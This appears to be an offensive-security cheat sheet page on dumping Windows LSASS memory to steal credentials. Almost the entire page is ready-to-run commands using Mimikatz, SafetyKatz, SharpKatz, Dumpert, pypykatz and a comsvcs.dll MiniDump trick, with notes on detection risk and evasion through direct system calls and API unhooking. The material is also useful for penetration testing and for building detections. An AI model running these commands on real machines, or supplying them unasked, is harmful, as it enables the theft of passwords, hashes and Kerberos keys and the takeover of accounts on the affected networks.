# LSASS Dump

## LSASS

{% hint style="warning" %}
high chances of detection
{% endhint %}

```powershell
# Dump credentials on a local machine using Mimikatz.
Invoke-Mimikatz -Command '"sekurlsa::ekeys"' 

# Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
SafetyKatz.exe "sekurlsa::ekeys" 

# Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
SharpKatz.exe --Command ekeys

# Dump credentials using Dumpert (Direct System Calls and API unhooking)
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump

# Using pypykatz (Mimikatz functionality in Python)
pypykatz.exe live lsa

# Using comsvcs.dll
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump
<lsass process ID> C:\Users\Public\lsass.dmp full 
```
